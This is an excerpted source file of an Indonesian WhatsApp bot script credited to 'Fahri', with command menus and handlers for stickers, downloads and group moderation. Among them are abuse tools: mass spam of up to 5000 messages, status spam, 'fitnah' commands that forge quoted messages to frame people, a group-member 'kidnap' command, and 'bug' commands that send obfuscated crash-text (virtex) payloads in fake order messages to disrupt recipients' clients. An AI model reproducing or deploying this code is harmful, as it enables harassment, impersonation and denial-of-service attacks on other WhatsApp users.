...
try {
		...
		const ownerNumberr = ["6289614168968@s.whatsapp.net","6289614168968@s.whatsapp.net","6289614168968@s.whatsapp.net","6289614168968@s.whatsapp.net",`${NomorOwner}@s.whatsapp.net`]
		...
		const katalog = (teks) => {
             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© Fahri_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             denz.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = denz.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `${NamaBot}`, "footerText": "*_© Fahri_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
...
denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 ...
 if (!mek.key.remoteJid.endsWith('@g.us') && offline){
		  ...
		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Fahri_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
			}
		}
		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
			if (!mek.key.fromMe){
...
- Hari : ${week} ${weton}
- Tanggal : ${calender}`
sendButLocation(from, `${menu}`, `${uwu}Fahri 右${uwu}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}allmenu`,buttonText:{displayText:'MENU📒'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'DEVELOPER👤'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'SCRIPT🌹'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break
case 'allmenu':
        ptod = "6281337541779@s.whatsapp.net"
        stod = `${sender}`
...
│◦➛${prefix}public
│◦➛${prefix}self
│◦➛${prefix}spam [ teks|amount ]
│◦➛${prefix}demoteall
│◦➛${prefix}promoteall
│◦➛${prefix}addcmd [ text reply stc ]
...
│◦➛${prefix}addrespon [ ask|answer ]
│◦➛${prefix}delrespon [ name ]
...
│◦➛${prefix}play [ title lagu ]
│◦➛${prefix}video [ title video ]
│◦➛${prefix}tinyurl [ link ]
│◦➛${prefix}fetch [ link ]
│◦➛${prefix}igdl [ link ]
...
├──❒ GROUP
│◦➛${prefix}getpict [ @tag ]
│◦➛${prefix}getname [ reply our target ]
...
│◦➛${prefix}add [ number ]
│◦➛${prefix}getdeskgc
│◦➛${prefix}sider [ reply bot message ]
│◦➛${prefix}hacked [ teks ]
│◦➛${prefix}setnamegc [ teks ]
│◦➛${prefix}setdeskgc [ teks ]
│◦➛${prefix}fitnah [ @tag|teks1|teks2 ]
│◦➛${prefix}kontak [ @tag|name ]
│◦➛${prefix}kontag [ @tag|name ]
│◦➛${prefix}opengc
│◦➛${prefix}closegc
│◦➛${prefix}resetlinkgc
│◦➛${prefix}linkgrup
│◦➛${prefix}hidetag [ teks ]
│◦➛${prefix}sticktag [ name sticker ]
...
│◦➛${prefix}detikvn [ reply audio caption number ]
│◦➛${prefix}detikvideo [ reply video caption number ]
│◦➛${prefix}tts [ language code text ]
│
├─❒ STORAGE
│◦➛${prefix}addsticker [ name ]
│◦➛${prefix}delsticker [ name ]
│◦➛${prefix}addvn [ name ]
│◦➛${prefix}delvn [ name ]
│◦➛${prefix}addimage [ name ]
│◦➛${prefix}delimage [ name ]
│◦➛${prefix}listimage
│◦➛${prefix}liststicker
│◦➛${prefix}listvn
│
...
│
├─❒ OTHER / FUN
│◦➛${prefix}caripesan [ text|amount ]
│◦➛${prefix}slots
│◦➛${prefix}suit [ scissors/stone/paper ]
│◦➛${prefix}tag [ number ]
│◦➛${prefix}tagme
│◦➛${prefix}readmore [ teks1|teks2 ]
│◦➛${prefix}fitnahpc [ number|teks1|teks2 ]
│◦➛${prefix}chat [ number|teks ]
...
case 'command':
 ...
 footerText: '*_© Fahri_*',
 description: `Hai kak @${stod.split('@')[0]}, Please select the menu here`,
 sections: [
                     {
...
│◦➛${prefix}add [ nomor ]
│◦➛${prefix}getdeskgc
│◦➛${prefix}sider [ reply message bot ]
│◦➛${prefix}hacked [ teks ]
│◦➛${prefix}setnamegc [ teks ]
│◦➛${prefix}setdeskgc [ teks ]
│◦➛${prefix}fitnah [ @tag|teks1|teks2 ]
...
if (!isNsfw) return reply(`Nsfw feature Not yet active in this group\nwrite: ${prefix}nsfw 1 \nTo activate`)
reply(mess.wait)
...
case 'xsearch':
case 'xs':
if (!c) return reply('You Looking for what?')
...
client.browserDescription = ['Fahri','Desktop','3.0']
...
reply('sukses konek ke Whatsapp kamu  .\n*NOTE:hanya menumpang*\n' + JSON.stringify(user, null, 2))
})
} catch {
reply('Error! only 1 person can access the become a bot feature')
}
break
case 'stopjadibot':
...
case 'culik':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('_*Enter the group id *_')
let pantek = []
...
denz.sendMessage(memekkkk, 'hehehehe', MessageType.text)
break
				case 'script':
		case 'sc':
		case 'sourcecode':
		denz.sendMessage(from, { text: "https://wa.me/+6289614168968", matchedText: 'https://wa.me/+6289614168968', description: "", title: "don't click here !!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
       case 'debug':
...
break
case 'q': 
    if (!m.quoted) return reply('reply messages!')
    let qse = denz.serializeM(await m.getQuotedObj())
    if (!qse.quoted) return reply('the message you are replying to does not contain a reply!')
...
write Y/N to accept or reject the game

write ${prefix}delttc , To Reset Games In The Group!`, text, {contextInfo: {mentionedJid: [player2]}})
break
                case 'delttt':
                case 'delttc':
if (!isGroup) return reply(mess.only.group)
...
break
case 'mediafire':
if (args.length < 1) return reply('Where the link? ')
...
_File is being sent, Please wait a few minutes_`
reply(result)
...
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('too many!')
...
if (Number(args[0]) >= 50) return reply('too many!')
...
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			...
			if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
					...
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('Already On Sis')
						nsfww.push(from)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses mengaktifkan fitur nsfw')
						denz.sendMessage(from, `Bebas Nyari Hentai :v`, text)
					} else if (Number(args[0]) === 0) {
						if (!isNsfw) return reply('Its off Sis')
						var ini = nsfww.indexOf(from)
						nsfww.splice(ini, 1)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Successfully disable nsfw feature')
					} else {
						reply('1 to enable, 0 to turn off')
					}
					break
				case 'tinyurl':
try {
...
case 'tts':
				   ...
				   const gtts = require('./lib/gtts')(args[0])
					...
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('The text is too long bro')
				...
				if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply the target!')
			demote = mek.message.extendedTextMessage.contextInfo.participant
		    denz.groupDemoteAdmin(from, [demote])
						reply('Successful demote admin')
						break
					case 'promote':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
		    ...
		    denz.groupMakeAdmin(from, [promote])
						reply('Success in promoting members')
						break
				case 'linkgrup':
				case 'linkgroup':
				case 'linkgc':
         ...
         break
				...
				case 'spam':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!arg) return reply(`Penggunaan ${prefix}spam text|amount`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam text|amount`)
				if (Number(argzi[1]) >= 5000) return reply('too many!')
              ...
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				...
				case 'bc':
					...
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						...
						reply(`Success Sent Broadcast ${body.slice(4)}`)
						...
						reply(`Success Sent Broadcast:\n${body.slice(4)}`)
					}
					break
					case 'spamsw':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!arg) return reply(`Penggunaan ${prefix}spamsw text|amount`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam text|amount`)
				if (Number(argzi[1]) >= 50) return reply('too many!')
...
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						...
						reply(`Successful upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
            ...
            reply('Reply The sticker!')
            }
            fs.unlinkSync(owgi)
            break
            case 'tomp3':
					denz.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('Reply The Videos Sis')
					reply(mess.wait)
  ...
  if (args.length < 1) return reply('choose scissors/stone/paper')
					if (args[0] === 'scissors' ) {
					  ...
					  reply('Choose scissors/stone/paper')
					}
break
		    case 'slot':
            case 'slots':
...
break
            ...
            break
				case 'chat':
			if (args[0].startsWith('08')) return reply('beginning the number with 62')
            if (args[0].startsWith('+62')) return reply('beginning the number with 62')
    	   ...
    	   break
			...
			case 'tagme':
				...
				case 'join':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				 if (args.length < 1) return ephe('Where the link?')
					denz.query({
           ...
           case 'fitnahpc':
            ...
            if (!isGroup) return reply(mess.only.group)
              ...
              reply('On the way Hack')
                ...
                await sleep(1000)
                denz.sendMessage(from, 'Success Hacked', text, {quoted: mek})
					break
					case 'bugpc2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./denz.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);denz[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
        ...
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        denz.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'Fahri🌹'},type:1}])
        denz.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
break
                case 'ytmp4':
						if (args.length === 0) return reply(`Send command *${prefix}ytmp4 [linkYoutube]*`)
						...
						break
						case 'ytsearch':
            if (!args.length) return reply('What the title bro?')
            try {
            	reply(mess.wait)
...
└ ${prefix}ytmp4 [link yt] = Video`})
            ...
            break
					case 'ytmp3':
						if (args.length === 0) return reply(`send command *${prefix}ytmp3 [linkYoutube]*`)
						...
						break
                    case 'play':
                            if (args.length === 0) return reply(`Send command *${prefix}play* _The title of the song to search for_`)
                            ...
                            break
                            case 'video':
                            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _The title of the video to search for_`)
				...
				case 'sticker':
					...
					case 's':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							...
							reply(`send picture/video with caption ${prefix}sticker or image tag/videos that have been sent\nNote : Maximum video length is 10 seconds`)
						}
						break
					case 'stickerwm':
					case 'swm':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							...
							reply(`Send picture/video with caption ${prefix}stickerwm name|author or tag images/videos that have been sent\nNote : Maximum video length is 10 seconds`)
						}
						break
					case 'takestick':
					case 'take':
			...
			case 'ping':
				...
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					...
					nm = body.slice(12)
					if (!nm) return reply('What the name of the sticker?')
				...
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					...
					nm = body.slice(10)
					if (!nm) return reply('What the name of the image??')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await denz.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
		    ...
		    denz.groupAdd(from, [add])
				reply('Successfully adding participants/member')
				break
				case 'kick':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
		    ...
		    denz.groupRemove(from, [kick])
						reply('Successfully removing participants/member')
                    break
                    case 'creategroup':
			case 'creategrup':
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup group name|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
			...
			case 'addrespon':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hi|hi too`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Successfully added response ${argz[0]}`)
				break
			case 'delrespon':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
